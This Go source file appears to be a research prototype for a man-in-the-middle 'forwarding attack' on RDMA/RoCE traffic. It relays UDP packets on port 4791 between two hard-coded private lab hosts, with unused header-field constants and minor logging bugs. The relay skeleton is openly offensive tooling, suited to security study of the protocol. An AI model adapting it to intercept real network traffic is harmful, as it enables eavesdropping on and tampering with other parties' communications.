package main

import (
    "log"
    "net"
    )

const RDMAPort = "4791"

var b09_17IP = "10.0.0.17"
var b09_15IP = "10.0.1.15"

const (
    OpCodeSize = 8
    SolicitedEventSize = 1
    MigReqSize = 1
    PadCountSize = 2
    TransportHeaderVersionSize = 4
    PartitionKeySize = 16
    FRes1Size = 1
    BRes1Size = 1
    ReservedVariantSize = 6
    DestinationQPSize = 24
    AckNowledgeRequestSize = 1
    ReservedSize = 7
    PacketSequenceNumberSize = 24
    PaddingSize = 16
    ICRCSize = 4


    ///Constants for networking
    BUFFSIZE = 4096 * 16
)

type Attack interface {
    RunAttack(aliceChan, bobChan chan []byte, doneChan chan bool)
}

type ForwardingAttack struct {
    aliceIP string
    bobIP string
}

func main() {

    log.Println("starting the attacker")
    aliceConn := setupUDPConn(b09_17IP,RDMAPort)
    bobConn := setupUDPConn(b09_15IP,RDMAPort)
    aliceChan := make(chan []byte, 1)
    bobChan := make(chan []byte, 1)
    doneChan := make(chan bool, 1)
    go connectionMannager(aliceConn, aliceChan)
    go connectionMannager(bobConn, bobChan)

    var fa ForwardingAttack
    PerformAttack(fa, aliceChan, bobChan, doneChan)

}

func PerformAttack(attack Attack, aliceChan, bobChan chan []byte, doneChan chan bool) {
    attack.RunAttack(aliceChan,bobChan,doneChan)
    <-doneChan
}

func (f ForwardingAttack) RunAttack(aliceChan, bobChan chan []byte, doneChan chan bool) {
    //Forwarding Attack
    for {
        select {
            case buf := <- aliceChan:
                log.Println("Received %X from alice",buf[0])
                bobChan <- buf
            case buf := <- bobChan:
                log.Println("Received %X from bob",buf[0])
                aliceChan <- buf
        }
    }

}

func connectionMannager(conn *net.UDPConn, rwchan chan []byte) {
    
    rchan := make(chan []byte)
    wchan := make(chan []byte)
    go readWrapper(conn, rchan)
    go writeWrapper(conn, wchan)
    for {
        select {
            case buf := <- rwchan:
                wchan <- buf
            case buf := <- rchan:
                rwchan <- buf
        }
    }
}

func readWrapper(conn *net.UDPConn, rchan chan []byte) {
    buf := make([]byte, BUFFSIZE)
    for {
        n, err := conn.Read(buf)
        if err != nil {
            log.Fatal(err)
        }
        rchan <- buf[0:n]
    }
}

func writeWrapper(conn *net.UDPConn, wchan chan []byte) {
    for {
        buf := <- wchan
        n, err := conn.Write(buf)
        if err != nil {
            log.Fatalf("Unable to write %d bytes: Error %s",n, err.Error())
        }
    }
}

func setupUDPConn(address string, port string) *net.UDPConn {
    raddr , err := net.ResolveUDPAddr("udp", address + ":" + port)
    if err != nil {
        log.Fatal(err)
    }
    conn , err := net.DialUDP("udp", nil, raddr)
    if err != nil {
        log.Fatal(err)
    }
    return conn
}
